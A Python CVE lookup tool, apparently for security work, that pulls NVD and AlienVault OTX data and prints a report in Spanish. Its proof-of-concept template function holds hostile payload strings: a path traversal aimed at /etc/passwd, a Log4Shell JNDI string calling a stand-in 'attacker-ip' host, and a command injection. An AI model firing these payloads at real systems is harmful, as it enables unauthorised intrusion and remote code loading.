import requests
import sys
import argparse
import textwrap
import os
from datetime import datetime

# ==========================================
# IDENTIDAD VISUAL VAMPSECURE
# ==========================================
BANNER = r"""
  __     __                      _____                            
  \ \   / /                     / ____|                           
   \ \_/ /__ _ _ __ ___  _ __ | (___   ___  ___ _   _ _ __ ___  
    \   / _` | '_ ` _ \| '_ \ \___ \ / _ \/ __| | | | '__/ _ \ 
     | | (_| | | | | | | |_) |____) |  __/ (__| |_| | | |  __/ 
     |_|\__,_|_| |_| |_| .__/|_____/ \___|\___|\__,_|_|  \___| 
                       | |         [VAMP-CVE-ORACLE ULTIMATE]
                       |_|         Region-Aware Intel
"""

NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId="
OTX_API_URL = "https://otx.alienvault.com/api/v1/indicators/cve/"
OTX_API_KEY = os.getenv("OTX_API_KEY", "TU_API_KEY_AQUI") 

def fetch_cve_data(cve_id):
    try:
        response = requests.get(f"{NVD_API_URL}{cve_id}", timeout=15)
        if response.status_code == 200:
            data = response.json()
            return data['vulnerabilities'][0]['cve'] if data['vulnerabilities'] else None
    except: pass
    return None

def fetch_otx_intel(cve_id):
    headers = {"X-OTX-API-KEY": OTX_API_KEY}
    try:
        response = requests.get(f"{OTX_API_URL}{cve_id}/general", headers=headers, timeout=15)
        if response.status_code == 200:
            return response.json().get('pulse_info', {}).get('pulses', [])
    except: pass
    return []

def generate_poc_template(cve_data):
    desc = cve_data['descriptions'][0]['value'].lower()
    if "path traversal" in desc or "directory traversal" in desc:
        return "Payload: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\nEstrategia: Bypass de normalización de ruta."
    elif "jndi" in desc or "log4j" in desc:
        return "Payload: ${jndi:ldap://attacker-ip:1389/Exploit}\nEstrategia: Remote Class Loading via LDAP."
    elif "remote code execution" in desc or "rce" in desc:
        return "Payload: ; whoami #\nEstrategia: Command Injection / OS Interaction."
    return "Vector complejo: Requiere análisis de flujo de datos manual."

def main():
    parser = argparse.ArgumentParser(description="VampSecure CVE Analyzer & Reporter")
    parser.add_argument("cve", help="ID del CVE (ej: CVE-2021-41773)")
    parser.add_argument("-o", "--output", help="Ruta del archivo de salida para el reporte")
    args = parser.parse_args()

    print(BANNER)
    cve_id = args.cve.upper()
    cve_info = fetch_cve_data(cve_id)
    otx_pulses = fetch_otx_intel(cve_id)

    if not cve_info:
        print(f"[!] No se pudo obtener información para {cve_id}.")
        return

    # --- LÓGICA DE TIEMPO REGIONAL ---
    # .astimezone() sin argumentos detecta la zona horaria del sistema local
    local_time = datetime.now().astimezone().strftime('%Y-%m-%d %H:%M:%S %Z %z')
    
    metrics = cve_info.get('metrics', {}).get('cvssMetricV31', [{}])[0].get('cvssData', {})
    score = metrics.get('baseScore', 'N/A')
    vector = metrics.get('vectorString', 'N/A')
    description = cve_info['descriptions'][0]['value']
    poc = generate_poc_template(cve_info)

    report_lines = [
        "=================================================================",
        f"VAMPSECURE INTELLIGENCE REPORT - {cve_id}",
        f"Timestamp Local: {local_time}",
        "=================================================================",
        f"\n[+] SEVERIDAD (CVSS v3.1): {score}",
        f"[+] VECTOR: {vector}",
        "\n[+] DESCRIPCIÓN TÉCNICA:",
        textwrap.fill(description, width=70),
        "\n" + "-"*40,
        "INTELIGENCIA DE AMENAZAS (OTX):",
    ]

    if otx_pulses:
        report_lines.append(f"[!] Detectados {len(otx_pulses)} pulsos de actividad.")
        for p in otx_pulses[:3]:
            report_lines.append(f"- Amenaza: {p['name']} | Tags: {', '.join(p['tags'][:3])}")
    else:
        report_lines.append("[*] Sin actividad masiva registrada.")

    report_lines.extend([
        "\n" + "-"*40,
        "ESTRATEGIA DE PRUEBA DE CONCEPTO (PoC):",
        poc,
        "\n" + "="*65
    ])

    full_report = "\n".join(report_lines)
    print(full_report)

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(BANNER + "\n")
                f.write(full_report)
            print(f"\n[+] REPORTE GUARDADO: {args.output}")
        except Exception as e:
            print(f"\n[!] Error al escribir: {e}")

if __name__ == "__main__":
    main()
